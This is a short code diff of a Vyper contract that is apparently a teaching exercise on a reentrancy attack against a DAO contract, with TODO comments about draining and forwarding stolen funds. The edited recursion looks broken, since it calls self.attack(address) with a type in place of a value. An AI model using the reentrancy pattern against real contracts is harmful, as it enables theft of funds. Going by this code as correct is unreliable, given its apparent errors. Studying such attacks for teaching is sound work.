@@ -19,7 +19,6 @@ def _attack() -> bool:
     # Make sure you add a "base case" to end the recursion
     if self.dao_address.withdraw()==False:
         return False
-    self._attack()
     return True
 
 @external
@@ -36,10 +35,12 @@ def attack(dao_address:address):
     dao_address.deposit()
     
     # TODO: Start the reentrancy attack
-    self._attack()
+    if self.attack(address)==False:
+        return False
+       
     # TODO: After the recursion has finished, all the stolen funds are held by this contract. Now, you need to send all funds (deposited and stolen) to the entity that called this contract
     
-    pass
+    return True
 
 @external
 @payable
